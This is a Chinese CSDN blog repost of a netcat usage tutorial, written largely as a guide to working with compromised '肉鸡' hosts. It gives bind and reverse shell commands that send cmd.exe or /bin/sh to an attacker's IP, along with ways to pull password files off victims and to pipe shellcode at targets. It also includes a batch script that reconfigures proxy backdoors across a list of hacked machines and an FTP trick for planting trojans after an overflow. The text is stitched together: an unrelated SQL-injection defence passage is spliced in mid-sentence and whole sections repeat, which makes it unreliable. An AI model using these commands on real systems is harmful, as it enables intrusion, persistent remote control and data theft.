# NC工具的使用说明教程 - xqhrs232的专栏 - CSDN博客
2017年04月25日 11:58:45[xqhrs232](https://me.csdn.net/xqhrs232)阅读数：1284
原文地址::[http://blog.csdn.net/xysoul/article/details/52270149](http://blog.csdn.net/xysoul/article/details/52270149)
相关文章
1、入侵主机后，利用nc的一些方法----[http://zerosecurity.blog.51cto.com/9913090/1613252/](http://zerosecurity.blog.51cto.com/9913090/1613252/)
**nc的使用方法**
**netcat被誉为网络安全界的‘瑞士军刀’，相信没有什么人不认识它吧......一个简单而有用的工具，透过使用TCP或UDP协议的网络连接去读写数据。它被设计成一个稳定的后门工具，能够直接由其它程序和脚本轻松驱动。同时，它也是一个功能强大的网络调试和探测工具，能够建立你需要的几乎所有类型的网络连接，还有几个很有意思的内置功能(详情请看下面的使用方法)。 **
**在中国，它的WINDOWS版有两个版本，一个是原创者Chris Wysopal写的原版本，另一个是由‘红与黑’编译后的新‘浓缩’版。‘浓缩’版的主程序只有10多KB（10多KB的NC是不能完成下面所说的第4、第5种使用方法，有此功能的原版NC好象要60KB：P），虽然“体积”小，但很完成很多工作。**
**软件介绍：**
**工具名：Netcat作者：Hobbit && Chris Wysopal网址：**[**http://www.atstake.com/research/tools/network_utilities/**](http://www.atstake.com/research/tools/network_utilities/)
**类别：开放源码平台：[Linux](http://lib.csdn.net/base/linux)/BSD/Unix/Windows **WINDOWS**下版本号：[v1.10 NT]**
**参数介绍：**
**nc.exe -h即可看到各参数的使用方法。基本格式：nc [-options] hostname port[s] [ports] ...**nc -l -p port [options] [hostname] [port]****
**-d 后台模式**-e prog **程序重定向，一旦连接，就执行 [危险!!]**-g gateway source-routing hop point[s], up to 8-G num source-routing pointer: 4, 8, 12, ...-h **帮助信息**-i secs **延时的间隔**-l **监听模式，用于入站连接**-L **连接关闭后,仍然继续监听**-n **指定数字的IP地址，不能用hostname**-o file **记录16进制的传输**-p port **本地端口号**-r **随机本地及远程端口**-s addr **本地源地址**-t **使用TELNET交互方式**-u UDP**模式**-v **详细输出--用两个-v可得到更详细的内容**-w secs timeout**的时间**-z **将输入输出关掉--用于扫描时**
**端口的表示方法可写为M-N的范围格式。**
**基本用法：**
**大概有以下几种用法：**
**1)连接到REMOTE主机，例子：格式：nc -nvv 192.168.x.x 80讲解：连到192.168.x.x的TCP80端口**
**2)监听LOCAL主机，例子：格式：nc -l -p 80讲解：监听本机的TCP80端口**
**3)扫描远程主机，例子：格式：nc -nvv -w2 -z 192.168.x.x 80-445讲解：扫描192.168.x.x的TCP80到TCP445的所有端口**
**4)REMOTE主机绑定SHELL，例子：格式：nc -l -p 5354 -t -e c:winntsystem32cmd.exe讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口**
**5)REMOTE主机绑定SHELL并反向连接，例子：格式：nc -t -e c:winntsystem32cmd.exe 192.168.x.x 5354讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口**
**以上为最基本的几种用法（其实NC的用法还有很多，当配合管道命令“|”与重定向命令“<”、“>”等等命令功能更强大......）。**
**高级用法：**
**6)作攻击程序用，例子：格式1：type.exe c:exploit.txt|nc -nvv 192.168.x.x 80格式2：nc -nvv 192.168.x.x 80 < c:exploit.txt讲解：连接到192.168.x.x的80端口，并在其管道中发送c:exploit.txt的内容(两种格式确有相同的效果，真是有异曲同工之妙:P)**
**附：c:exploit.txt为shellcode等**
**7)作蜜罐用[1]，例子：格式：nc -L -p 80讲解：使用-L(注意L是大写)可以不停地监听某一个端口，直到ctrl+c为止.**
**8)作蜜罐用[2]，例子：格式：nc -L -p 80 > c:log.txt讲解：使用-L可以不停地监听某一个端口，直到ctrl+c为止，同时把结果输出到c:log.txt中，如果把‘>’改为‘>>’即可以追加日志。**
**附：c:log.txt为日志等**
**9)作蜜罐用[3]，例子：格式1：nc -L -p 80 < c:honeypot.txt格式2：type.exe c:honeypot.txt|nc -L -p 80讲解：使用-L可以不停地监听某一个端口，直到ctrl+c为止，并把c:honeypot.txt的内容‘送’入其管道中。**
NC工具的使用说明
参数介绍： 
nc.exe -h即可看到各参数的使用方法。 
基本格式：nc [-options] hostname port [ports] ... 
nc -l -p port [options] [hostname] [port]
-d 后台模式 
-e prog 程序重定向，一旦连接，就执行 [危险!!] 
-g gateway source-routing hop point, up to 8 
-G num source-routing pointer: 4, 8, 12, ... 
-h 帮助信息 
-i secs 延时的间隔 
-l 监听模式，用于入站连接 
-L 连接关闭后,仍然继续监听 
-n 指定数字的IP地址，不能用hostname 
-o file 记录16进制的传输 
-p port 本地端口号 
-r 随机本地及远程端口 
-s addr 本地源地址 
-t 使用TELNET交互方式 
-u UDP模式 
-v 详细输出--用两个-v可得到更详细的内容 
-w secs timeout的时间 
-z 将输入输出关掉--用于扫描时
端口的表示方法可写为M-N的范围格式。
===========================================================================================
基本用法：
大概有以下几种用法：
1)连接到REMOTE主机，例子： 
格式：nc -nvv 192.168.x.x 80 
讲解：连到192.168.x.x的TCP80端口
2)监听LOCAL主机，例子： 
格式：nc -l -p 80 
讲解：监听本机的TCP80端口
3)扫描远程主机，例子： 
格式：nc -nvv -w2 -z 192.168.x.x 80-445 
讲解：扫描192.168.x.x的TCP80到TCP445的所有端口
4)REMOTE主机绑定SHELL，例子： 
格式：nc -l -p 5354 -t -e c:winntsystem32cmd.exe 
讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口
5)REMOTE主机绑定SHELL并反向连接，例子： 
格式：nc -t -e c:winntsystem32cmd.exe 192.168.x.x 5354 
讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口
以上为最基本的几种用法（其实NC的用法还有很多， 
当配合管道命令“|”与重定向命令“<”、“>”等等命令功能更强大......）。
=========================================================================================== 
高级用法：
6)作攻击程序用，例子： 
格式1：type.exe c:exploit.txt|nc -nvv 192.168.x.x 80 
格式2：nc -nvv 192.168.x.x 80 < c:exploit.txt 
讲解：连接到192.168.x.x的80端口，并在其管道中发送c:exploit.txt的内容(两种格式确有相同的效果， 
真是有异曲同工之妙:P)
附：c:exploit.txt为shellcode等
7)作蜜罐用[1]，例子： 
格式：nc -L -p 80 
讲解：使用-L(注意L是大写)可以不停地监听某一个端口，直到ctrl+c为止
8)作蜜罐用[2]，例子： 
格式：nc -L -p 80 > c:log.txt 
讲解：使用-L可以不停地监听某一个端口，直到ctrl+c为止，同时把结果输出到c:log.txt中，如果把‘>’ 
改为‘>>’即可以追加日志
附：c:log.txt为日志等
9)作蜜罐用[3]，例子：
格式1：nc -L -p 80 < c:honeypot.txt
格式2：type.exe c:honeypot.txt|nc -L -p 80
讲解：使用-L可以不停地监听某一个端口，直到ctrl+c为止，并把c:honeypot.txt的内容‘送’入其管道中如果攻击者知道应用会将表单中输入的内容直接用于验证身份的查询，他就会尝试输入某些特殊的SQL字符串篡改查询改变其原来的功能，欺骗系统授予访问权限。
系统环境不同，攻击者可能造成的损害也不同，这主要由应用访问[数据库](http://lib.csdn.net/base/mysql)
的安全权限决定。如果用户的帐户具有管理员或其他比较高级的权限，攻击者就可能对数据库的表执行各种他想要做的操作，包括添加、删除或更新数据，甚至可能直接删除表。
二、如何防范？
好在要防止ASP[.NET](http://lib.csdn.net/base/dotnet)应用被SQL注入式攻击闯入并不是一件特别困难的事情，只要在利用表单输入的内容构造SQL命令之前，把所有输入内容过滤一番就可以了。过滤输入内容可以按多种方式进行。
⑴ 对于动态构造SQL查询的场合，可以使用下面的技术：
第一：替换单引号，即把所有单独出现的单引号改成两个单引号，防止攻击者修改SQL命令的含义。再来看前面的例子，“Select * from Users Where login = or 1=1 AND password = or 1=1”显然会得到与“Select * from Users Where login = or 1=1 AND password = or 1=1”不同的结果。
第二：删除用户输入内容中的所有连字符，防止攻击者构造出类如“Select * from Users Where login = mas -- AND password =”之类的查询，因为这类查询的后半部分已经被注释掉，不再有效，攻击者只要知道一个合法的用户登录名称，根本不需要知道用户的密码就可以顺利获得访问权限。
第三：对于用来执行查询的数据库帐户，限制其权限。用不同的用户帐户执行查询、插入、更新、删除操作。由于隔离了不同帐户可执行的操作，因而也就防止了原本用于执行Select命令的地方却被用于执行Insert、Update或Delete命令。
⑵ 用存储过程来执行所有的查询。SQL参数的传递方式将防止攻击者利用单引号和连字符实施攻击。此外，它还使得数据库权限可以限制到只允许特定的存储过程执行，所有的用户输入必须遵从被调用的存储过程的安全上下文，这样就很难再发生注入式攻击了。
⑶ 限制表单或查询字符串输入的长度。如果用户的登录名字最多只有10个字符，那么不要认可表单中输入的10个以上的字符，这将大大增加攻击者在SQL命令中插入有害代码的难度。
⑷ 检查用户输入的合法性，确信输入的内容只包含合法的数据。数据检查应当在客户端和服务器端都执行——之所以要执行服务器端验证，是为了弥补客户端验证机制脆弱的安全性。
在客户端，攻击者完全有可能获得网页的源代码，修改验证合法性的脚本（或者直接删除脚本），然后将非法内容通过修改后的表单提交给服务器。因此，要保证验证操作确实已经执行，唯一的办法就是在服务器端也执行验证。你可以使用许多内建的验证对象，例如RegularExpressionValidator，它们能够自动生成验证用的客户端脚本，当然你也可以插入服务器端的方法调用。如果找不到现成的验证对象，你可以通过CustomValidator自己创建一个。
⑸ 将用户登录名称、密码等数据加密保存。加密用户输入的数据，然后再将它与数据库中保存的数据比较，这相当于对用户输入的数据进行了“消毒”处理，用户输入的数据不再对数据库有任何特殊的意义，从而也就防止了攻击者注入SQL命令。System.Web.Security.formsAuthentication类有一个HashPasswordForStoringInConfigFile，非常适合于对输入数据进行消毒处理。
⑹ 检查提取数据的查询所返回的记录数量。如果程序只要求返回一个记录，但实际返回的记录却超过一行，那就当作出错处理。
参数解释： 
-e 程序重定向 
-t 用telnet来回应 
-l  监听本地端口 
-p  指定本地端口 
-v  获得端口信息 
-vv  获得详细的端口信息 
-z  关闭输入输出 
-n  指定IP地址 
-w 设定超时时间 
-u  UDP端口
我就知道这么些参数 了
第一个: 
nc -l -v -p 7626 
这就是打开本地的7626端口进行监听，并反馈连接信息这样如果有扫描冰河木马的人会认为你中了木马开放了7626，和“小猪快跑”的功能有点象，再加个批处理文件一起用的话就是一个“小猪快跑”了
如果要监视是否有入侵本地80端口的行为，并记下来，用这个命令： 
nc -l -p 80 >>c:\\日志.dat 
这样，凡是有针对本机80端口的攻击都会被记录下来的
二、 
如果你通过溢出进入了别人的机器，就可以运行： 
nc -l -p 123 -e cmd.exe 
或者是: nc -l -p 123 -t 
作用都是以cmd.exe来响应到机器上123端口的连接 
这样就把溢出的主机变成了一台telnet肉鸡了啊 
你也可一用命令让肉鸡主动连接你的主机,假设我的IP是192.168.0.1 
在肉鸡上运行： nc -e cmd.exe 192.168.0.1 777 
再在本地机器上运行： nc -l -p 777 
意思是让肉鸡将cmd.exe(就是个shell)主动响应到你电脑的777端口 
你再在本地机上监听777端口，这样就进入了对方的cmd了 
这也微十时毫 反弹端口式木马的原理了。
三、 
用这个命令： 
nc -v 192.168.0.25 80 
就获得了192.168.0.25的80端口的信息 
可以获得IIS版本等很多重要信息 的
四、 
你也可以将NC作为扫描器使用： 
nc -v -z 192.168.0.25 1-100 
扫描192.168.0.25的1到100间的TCP端口
用nc -v -z -u 192.168.0.25 1-100 
这是扫描1到00间的UDP端口
3.1.端口的刺探：
nc -vv ip port 
RIVER [192.168.0.198] 19190 (?) open //显示是否开放open
3.2.扫描器
nc -vv -w 5 ip port-port port 
nc -vv -z ip port-port port
　　这样扫描会留下大量的痕迹，系统管理员会额外小心。
3.3. 后门
victim machine: //受害者的机器 
nc -l -p port -e cmd.exe //win2000 
nc -l -p port -e /bin/sh //unix,linux 
attacker machine: //攻击者的机器. 
nc ip -p port //连接victim_IP,然后得到一个shell。
3.4.反向连接 
attacker machine: //一般是sql2.exe,远程溢出,webdavx3.exe攻击. 
//或者wollf的反向连接. 
nc -vv -l -p port 
victim machine: 
nc -e cmd.exe attacker ip -p port 
nc -e /bin/sh attacker ip -p port
或者：
attacker machine: 
nc -vv -l -p port1  
nc -vv -l -p prot2  
victim machine: 
nc attacker_ip port1 | cmd.exe | nc attacker_ip port2 
nc attacker_ip port1 | /bin/sh | nc attacker_ip port2
　　139要加参数-s（nc.exe -L -p 139 -d -e cmd.exe -s 对方机器IP），这样就可以保证nc.exe优先于NETBIOS。
3.5.传送文件：
3.5.1 attacker machine <-- victim machine //从肉鸡拖密码文件回来. 
nc -d -l -p port < path\filedest 　　　 可以shell执行 
nc -vv attacker_ip port > path\file.txt 需要Ctrl+C退出 
//肉鸡需要gui界面的cmd.exe里面执行(终端登陆,不如安装FTP方便).否则没有办法输入Crl+C.
3.5.2 attacker machine --> victim machine //上传命令文件到肉鸡 
nc －vv -l -p port > path\file.txt　　　　　 需要Ctrl+C退出 
nc -d victim_ip port < path\filedest 　 可以shell执行 
//这样比较好.我们登陆终端.入侵其他的肉鸡.可以选择shell模式登陆.
　3.6 端口数据抓包.
nc -vv -w 2 -o test.txt xfocus[.Net](http://lib.csdn.net/base/dotnet) 80 21-15
< 00000058 35 30 30 20 53 79 6e 74 61 78 20 65 72 72 6f 72 # 500 Syntax error 
< 00000068 2c 20 63 6f 6d 6d 61 6e 64 20 22 22 20 75 6e 72 # , command "" unr 
< 00000078 65 63 6f 67 6e 69 7a 65 64 2e 0d 0a # ecognized... 
< 00000084 83 00 00 01 8f # .....
3.7 telnet,自动批处理。
nc victim_ip port < path\file.cmd 　 显示执行过程. 
nc -vv victim_ip port < path\file.cmd 　 显示执行过程.
nc -d victim_ip port < path\file.cmd 安静模式.
_______________file.cmd________________________ 
password 
cd %windir% 
echo []=[%windir%] 
c: 
cd \ 
md test 
cd /d %windir%\system32\ 
net stop sksockserver 
snake.exe -config port 11111 
net start sksockserver 
exit 
_______________file.cmd__END___________________
######################################## 
4. 管理肉鸡,更改肉鸡设置 
########################################
4.1 比如要统一更改肉鸡上面的代理端口.snake.exe 修改为11111 服务名称"sksockserver"，使用winshell后门. 端口1234 密码password
命令格式就是：
modi.bat youip.txt
___________modi.bat____
________________________ 
@if "%1"=="" echo Error: no ip.txt &&goto END
:start 
@echo password >a.cmd 
@echo s >>a.cmd 
@echo cd /d %%windir%%\system32\ >>a.cmd 
@net stop "sksockserver" >>a.cmd 
@snake.exe -config port 11111 >>a.cmd 
@net start "sksockserver" >>a.cmd 
@exit >>a.cmd
:auto 
@for /f "eol=; tokens=1,2" %%i in (%1) do @(nc.exe -vv -w 3 %%i 1234 < a.cmd)
:END 
___________modi.bat__END_______________________
4.2 
@echo off 
color f0 
:start 
cls 
C:\nc -vv -w 3 -l -p 80>>80.txt 
goto start
　　把防火墙关掉以后运行这个批处理，会监听到许多探测U漏洞的信息，大多是三条一组--妮姆达病毒扫描你的。这样就会得到肉鸡的.虽然质量不高.但是也是一种便宜的办法.
　　肉鸡特征：
　　1。unicode漏洞 
　　2。guest密码为空，administrators组用户 
　　3。其他漏洞
一、基本使用：
Quack# nc -h 
[v1.10] 
　　想要连接到某处: nc [-options] hostname port [ports] ... 
　　绑定端口等待连接:　　 nc -l -p port [-options] [hostname] [port] 
　　参数: 
　　　　-e prog　　　　　　　　 程序重定向，一旦连接，就执行 [危险!!] 
　　　　-g gateway　　　　　　 source-routing hop point, up to 8 
　　　　-G num　　　　　　　　 source-routing pointer: 4, 8, 12, ... 
　　　　-h　　　　　　　　　　 帮助信息 
　　　　-i secs　　　　　　　　 延时的间隔 
　　　　-l　　　　　　　　　　 监听模式，用于入站连接 
　　　　-n　　　　　　　　　　 指定数字的IP地址，不能用hostname 
　　　　-o file　　　　　　　　 记录16进制的传输 
　　　　-p port　　　　　　　　 本地端口号 
　　　　-r　　　　　　　　　　 任意指定本地及远程端口 
　　　　-s addr　　　　　　　　 本地源地址 
　　　　-u　　　　　　　　　　 UDP模式 
　　　　-v　　　
　　　　　　　 详细输出——用两个-v可得到更详细的内容 
　　　　-w secs　　　　　　　　 timeout的时间 
　　　　-z　　　　　　　　　　 将输入输出关掉——用于扫描时
　　其中端口号可以指定一个或者用lo-hi式的指定范围。
二、用于传输文件——ncp
#! /bin/sh 
## 类似于rcp，但是是用netcat在高端口做的 
## 在接收文件的机器上做"ncp targetfile" 
## 在发送文件的机器上做"ncp sourcefile receivinghost" 
## 如果调用了 "nzp" ，会将传输文件压缩
## 这里定义你想使用的端口，可以自由选择 
MYPORT=23456
## 如果nc没有在系统路径中的话，要把下面一行注释去掉，加以修改 
# PATH=$:$ ; export PATH
## 下面这几行检查参数输入情况：
test "$3" && echo "too many args" && exit 1 
test ! "$1" && echo "no args?" && exit 1 
me=`echo $0 | sed s+.*/++` 
test "$me" = "nzp" && echo [compressed mode]
# if second arg, its a host to send an [extant] file to. 
if test "$2" ; then 
test ! -f "$1" && echo "cant find $1" && exit 1 
if test "$me" = "nzp" ; then 
　　compress -c < "$1" | nc -v -w 2 $2 $MYPORT && exit 0 
else 
　　nc -v -w 2 $2 $MYPORT < "$1" && exit 0 
fi 
echo "transfer FAILED!" 
exit 1 
fi
# 是否在接收文件机器当前目录有同名文件
if test -f "$1" ; then 
echo -n "Overwrite $1? " 
read aa 
test ! "$aa" = "y" && echo "[punted!]" && exit 1 
fi 
# 30 seconds oughta be pleeeeenty of time, but change if you want. 
if test "$me" = "nzp" ; then 
# 注意这里nc的用法，结合了重定向符号和管道 
nc -v -w 30 -p $MYPORT -l < /dev/null | uncompress -c > "$1" && exit 0 
else 
nc -v -w 30 -p $MYPORT -l < /dev/null > "$1" && exit 0 
fi 
echo "transfer FAILED!" 
# clean up, since even if the transfer failed, $1 is already trashed 
rm -f "$1" 
exit 1
这样的话，我只要在A机器上先 QuackA# ncp ../abcd 
listening on 然后在另一台机器B上 
QuackB#ncp abcd 192.168.0.2 
quackb [192.168.0.1] 23456 (?) 
A机上出现 
open connect to [192.168.0.2] from quackb [192.168.0.1] 1027 
#
　　查看一下，文件传输完毕。
![](http://pic002.cnblogs.com/images/2012/323200/2012121319563327.gif)
===========================================================================
【本地运行】nc -v ip port
【命令解释】扫瞄某 IP 的某个端口，返回信息详细输出。
===========================================================================
【本地运行】nc -v -z ip port-port
【命令解释】扫描某IP的端口到某端口，返回信息详细输出，但扫描速度较慢。
===========================================================================
【本地运行】nc -v -z -u ip  port-port
【命令解释】扫描某 IP 的某 UDP 端口到某 UDP 端口，返回信息详细输出，但扫描速度较慢。
===========================================================================
【本地运行】nc -l -p 80 
【命令解释】开启本机的 TCP 80 端口并监听。
===========================================================================
【本地运行】nc -l -v -p 80
【命令解释】开启本机的 TCP 80 端口并将监听到的信息输出到当前 CMD 窗口。
===========================================================================
【本地运行】nc -l -p 80 > E:/log.dat
【命令解释】开启本机的 TCP 80 端口并将监听到的信息输出到 E:/log.dat 下的日志文件里。
===========================================================================
【本地运行】nc -nvv 192.168.1.101 80 
【命令解释】连接到192.168.1.101主机的 80 端口。
===========================================================================
【本地运行】nc -nvv -w2 -z 192.168.1.101 80-1024 
【命令解释】扫锚192.168.1.101的80-1024端口，连接超时时间为2秒。
===========================================================================
【远程运行】nc -l -p 2012 -t -e cmd.exe
【本地运行】nc -nvv 192.168.1.101 2012
【命令解释】采用正向连接方式，远程主机（注：假设IP地址为 192.168.1.101）上运行 nc -l -p 2012 -t -e cmd.exe 意为绑定远程主机的 CMD 到
【命令解释】2012 端口，当本地主机连接远程主机成功时就会返回给本地主机一个CMD Shell ；在本地主机上运行 nc -nvv 192.168.1.101 2012 用于
【命令解释】连接已经将 CMD 重定向到 2012 端口的远程主机（注：假设IP地址为 192.168.1.101）。
===========================================================================
【本地运行】nc -l -p 2012
【远程运行】nc -t -e cmd.exe 192.168.1.102 2012
【命令解释】采用反向连接方式，先在本地主机运行 nc -l -p 2012 开启本地主机的（注：假设IP地址为 192.168.1.102）2012 端口并监听等待远程主
【命令解释】机连接；在远程主机上运行 nc -t -e cmd.exe 192.168.1.102 2012 将远程主机的 CMD 重定向到 IP 地址为 192.168.1.102 端口号为
【命令解释】2012 的主机上，连接成功后 IP 地址为 192.168.1.102 的主机会得到一个CMD Shell。
===========================================================================
【本地运行】nc -v -n ip port < C:/sunzn.exe
【远程运行】nc -v -l -p port > D:/sunzn.exe
【命令解释】在本地运行 nc -v -n ip port < C:/sunzn.exe 意为从本地 C 盘根目录中读取 sunzn.exe 文件的内容，并把这些数据发送到远程主机的
【命令解释】对应端口上（注：命令行中的 IP 为接收文件的远程主机 IP ），在远程主机运行 nc -v -l -p port > D:/sunzn.exe 意为监听对应端口并
【命令解释】把接收到的信息数据写到 D:/sunzn.exe 中，两行命令实现了文件在本地主机和远程主机间的传输。
===========================================================================
【本地运行】nc -L -p 8989<C:\ftp.txt （ ftp.txt 中为FTP自动下载命令）
【命令解释】不停地监听 8989 端口，并把 C:\ftp.txt  中的内容发给任何一台连接本机 8989 端口的主机，可起到传送文件作用（此用法经常用于反向
【命令解释】溢出）。溢出远程主机时，一旦溢出的远程主机连接本地主机 8989 端口，远程主机就会自动用 FTP 下载指定的文件，如木马。
===========================================================================
写一篇简单一点的使用教程：
命令1：监听命令
nc -l -p port
nc -l -p port > e:\log.dat
nc -l -v -p port
参数解释：
-l：监听端口，监听入站信息
-p：后跟本地端口号
-v：显示端口的信息，如果使用-vv的话，则会显示端口更详细的信息
提示：一般大家都爱用-vv
nc -l -p 80
这个很简单，监听80端口
如果机器上运行这个命令，端口80被认为是开放的，可以欺骗扫描器
nc -l -p 80 > e:\log.dat
将详细信息写入E盘log.dat的日志文件
nc -l -v -p 80
和上边命令相似，会直接显示信息在运行着NC的屏幕上。
实践：
例如：nc -l -v -p 80
然后在浏览器中输入本机IP：127.0.0.1
命令2：程序定向（反弹shell的方法）
nc -l -p port -t -e cmd.exe
本地机： nc -l -p port 或 nc -l -v -p port
目标机：nc -e cmd.exe ip port
参数解释：
-l、-p两个参数已经解释过了
-e；作用就是程序定向
-t：以telnet的形式来应答
例子
nc -l -p 5277 -t -e cmd.exe
千万不要运行在自己的机器上，如果运行了，你机器就会变成一台TELNET的服务器了。
命令解释为：监听本地端口5277的入站信息，同时将CMD.exe这个程序，重定向到端口5277上，当有人连接的时候，就让程序CMD.exe以TELNET的形式来响应连接要求。
说白了，其实就是让他成为一台TELNET的肉鸡，所以这个命令要运行在你的肉鸡上。
例如用法：
local machine：nc -l -p port ( or nc -l -v -p port )
remote machine：nc -e cmd.exe ip port
大家知道灰鸽子和神偷吧，这两款工具都是利用了反弹端口型的木马，
什么叫反弹端口？
就是说，当对方中马后，不用你主动和对方连接，也就是说不用从你的client端向对方主机上运行的server端发送请求连接，而是对方主动来连接你这样就可以使很多防火墙失效，因为很多防火墙都不检查出站请求的。这里这两个命令结合在一起后，于那两款木马可以说有异曲同工之效。
本地运行：nc -l -p 5277 （监听本地5277端口）或者 nc -l -v -p 5277
然后在远程机器上，想办法运行 nc -e cmd.exe ip 5277
（你可别真的打“ip”在肉鸡上啊）要打，xxx.xxx.xxx.xxx这样！！
这样就是反弹~~在本地机器上得到了一个SHELL
命令3：扫描端口
nc -v ip port
nc -v -z ip port-port
nc -v -z -u ip port-port
参数解释：
-z：将输入输出关掉，在扫描时使用
nc -v ip port
这个命令是针对某一个端口进行扫描
例如：
nc -v ip 135
扫描远程主机的135端口，这样获得了该端口的一些简单信息，但是针对某些端口，我们还可以获得更多的信息
例如：80端口
我们可以使用nc -v ip 80 然后使用get方法来获得对方的WEB服务器的信息
nc -v -z ip port-port
这个命令是用来扫描的一个命令，这个命令用于快速扫描TCP端口，而port-port则是指定了扫描的端口范围
例如：
nc -v -z ip 1-200
可以看到我机器上的1-200的TCP端口的开放情况
nc -v -z -u ip port-port
这个命令比上个命令多了个-u，这个命令的作用仍然是扫描端口，只是多了一个-u的参数，是用来扫UDP端口的
例如：
nc -v -z -u ip 1-200
这个命令就会扫1-200的UDP端口
命令4：传送文件（HOHO，I LIKE）
LOCAL MACHINE：nc -v -n ip port < x:\svr.exe
REMOTE MACHINE：nc -v -l -p port > y:\svr.exe
参数解释：
-n：指定数字的IP地址
这两个命令结合起来是用来传送文件的
首先，在远程机上运行命令：
nc -v -l -p 5277 > c:\pulist.exe
这个命令还记的吗？呵呵，是不是和监听命令有点类似，对，没错，这个是监听5277端口
并把接受到的信息数据写到c:\pulist.exe中
这时候在本地机上运行
nc -v -n ip 5277 < e:\hack\pulist.exe
这个命令的意思就是，从本地E盘跟目录中读取pulist.exe文件的内容，并把这些数据发送到ip的5277端口上
这样远程主机就会自动创建一个pulist.exe文件。
**nc的使用方法**
**netcat被誉为网络安全界的‘瑞士军刀’，相信没有什么人不认识它吧......一个简单而有用的工具，透过使用TCP或UDP协议的网络连接去读写数据。它被设计成一个稳定的后门工具，能够直接由其它程序和脚本轻松驱动。同时，它也是一个功能强大的网络调试和探测工具，能够建立你需要的几乎所有类型的网络连接，还有几个很有意思的内置功能(详情请看下面的使用方法)。 **
**在中国，它的WINDOWS版有两个版本，一个是原创者Chris Wysopal写的原版本，另一个是由‘红与黑’编译后的新‘浓缩’版。‘浓缩’版的主程序只有10多KB（10多KB的NC是不能完成下面所说的第4、第5种使用方法，有此功能的原版NC好象要60KB：P），虽然“体积”小，但很完成很多工作。**
**软件介绍：**
**工具名：Netcat作者：Hobbit && Chris Wysopal网址：**[**http://www.atstake.com/research/tools/network_utilities/**](http://www.atstake.com/research/tools/network_utilities/)
**类别：开放源码平台：Linux/BSD/Unix/Windows **WINDOWS**下版本号：[v1.10 NT]**
**参数介绍：**
**nc.exe -h即可看到各参数的使用方法。基本格式：nc [-options] hostname port[s] [ports] ...**nc -l -p port [options] [hostname] [port]****
**-d 后台模式**-e prog **程序重定向，一旦连接，就执行 [危险!!]**-g gateway source-routing hop point[s], up to 8-G num source-routing pointer: 4, 8, 12, ...-h **帮助信息**-i secs **延时的间隔**-l **监听模式，用于入站连接**-L **连接关闭后,仍然继续监听**-n **指定数字的IP地址，不能用hostname**-o file **记录16进制的传输**-p port **本地端口号**-r **随机本地及远程端口**-s addr **本地源地址**-t **使用TELNET交互方式**-u UDP**模式**-v **详细输出--用两个-v可得到更详细的内容**-w secs timeout**的时间**-z **将输入输出关掉--用于扫描时**
**端口的表示方法可写为M-N的范围格式。**
**基本用法：**
**大概有以下几种用法：**
**1)连接到REMOTE主机，例子：格式：nc -nvv 192.168.x.x 80讲解：连到192.168.x.x的TCP80端口**
**2)监听LOCAL主机，例子：格式：nc -l -p 80讲解：监听本机的TCP80端口**
**3)扫描远程主机，例子：格式：nc -nvv -w2 -z 192.168.x.x 80-445讲解：扫描192.168.x.x的TCP80到TCP445的所有端口**
**4)REMOTE主机绑定SHELL，例子：格式：nc -l -p 5354 -t -e c:winntsystem32cmd.exe讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口**
**5)REMOTE主机绑定SHELL并反向连接，例子：格式：nc -t -e c:winntsystem32cmd.exe 192.168.x.x 5354讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口**
**以上为最基本的几种用法（其实NC的用法还有很多，当配合管道命令“|”与重定向命令“<”、“>”等等命令功能更强大......）。**
**高级用法：**
**6)作攻击程序用，例子：格式1：type.exe c:exploit.txt|nc -nvv 192.168.x.x 80格式2：nc -nvv 192.168.x.x 80 < c:exploit.txt讲解：连接到192.168.x.x的80端口，并在其管道中发送c:exploit.txt的内容(两种格式确有相同的效果，真是有异曲同工之妙:P)**
**附：c:exploit.txt为shellcode等**
**7)作蜜罐用[1]，例子：格式：nc -L -p 80讲解：使用-L(注意L是大写)可以不停地监听某一个端口，直到ctrl+c为止.**
**8)作蜜罐用[2]，例子：格式：nc -L -p 80 > c:log.txt讲解：使用-L可以不停地监听某一个端口，直到ctrl+c为止，同时把结果输出到c:log.txt中，如果把‘>’改为‘>>’即可以追加日志。**
**附：c:log.txt为日志等**
**9)作蜜罐用[3]，例子：格式1：nc -L -p 80 < c:honeypot.txt格式2：type.exe c:honeypot.txt|nc -L -p 80讲解：使用-L可以不停地监听某一个端口，直到ctrl+c为止，并把c:honeypot.txt的内容‘送’入其管道中。**
**nc的使用方法**
**netcat被誉为网络安全界的‘瑞士军刀’，相信没有什么人不认识它吧......一个简单而有用的工具，透过使用TCP或UDP协议的网络连接去读写数据。它被设计成一个稳定的后门工具，能够直接由其它程序和脚本轻松驱动。同时，它也是一个功能强大的网络调试和探测工具，能够建立你需要的几乎所有类型的网络连接，还有几个很有意思的内置功能(详情请看下面的使用方法)。 **
**在中国，它的WINDOWS版有两个版本，一个是原创者Chris Wysopal写的原版本，另一个是由‘红与黑’编译后的新‘浓缩’版。‘浓缩’版的主程序只有10多KB（10多KB的NC是不能完成下面所说的第4、第5种使用方法，有此功能的原版NC好象要60KB：P），虽然“体积”小，但很完成很多工作。**
**软件介绍：**
**工具名：Netcat作者：Hobbit && Chris Wysopal网址：**[**http://www.atstake.com/research/tools/network_utilities/**](http://www.atstake.com/research/tools/network_utilities/)
**类别：开放源码平台：[Linux](http://lib.csdn.net/base/linux)/BSD/Unix/Windows **WINDOWS**下版本号：[v1.10 NT]**
**参数介绍：**
**nc.exe -h即可看到各参数的使用方法。基本格式：nc [-options] hostname port[s] [ports] ...**nc -l -p port [options] [hostname] [port]****
**-d 后台模式**-e prog **程序重定向，一旦连接，就执行 [危险!!]**-g gateway source-routing hop point[s], up to 8-G num source-routing pointer: 4, 8, 12, ...-h **帮助信息**-i secs **延时的间隔**-l **监听模式，用于入站连接**-L **连接关闭后,仍然继续监听**-n **指定数字的IP地址，不能用hostname**-o file **记录16进制的传输**-p port **本地端口号**-r **随机本地及远程端口**-s addr **本地源地址**-t **使用TELNET交互方式**-u UDP**模式**-v **详细输出--用两个-v可得到更详细的内容**-w secs timeout**的时间**-z **将输入输出关掉--用于扫描时**
**端口的表示方法可写为M-N的范围格式。**
**基本用法：**
**大概有以下几种用法：**
